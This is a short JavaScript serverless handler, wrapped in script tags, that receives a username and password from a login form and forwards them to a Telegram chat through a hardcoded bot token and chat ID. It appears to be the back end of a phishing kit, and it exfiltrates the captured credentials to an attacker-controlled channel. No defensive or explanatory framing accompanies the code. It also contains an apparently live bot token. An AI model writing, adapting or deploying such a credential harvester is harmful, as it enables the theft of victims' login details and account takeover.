<script>
  
  const fetch = require("node-fetch");

exports.handler = async (event) => {
  const TELEGRAM_BOT_TOKEN = "7796152859:AAFfFSI9R_b80cNkJpUMyF2_l9GctjiLxl4";
  const TELEGRAM_CHAT_ID = "6141072025";

  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const data = JSON.parse(event.body);
  const message = `New Login Attempt:\n👤 Username: ${data.username}\n🔒 Password: ${data.password}`;

  const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  await fetch(telegramURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
  });

  return { statusCode: 200, body: "Success" };
};
</script>
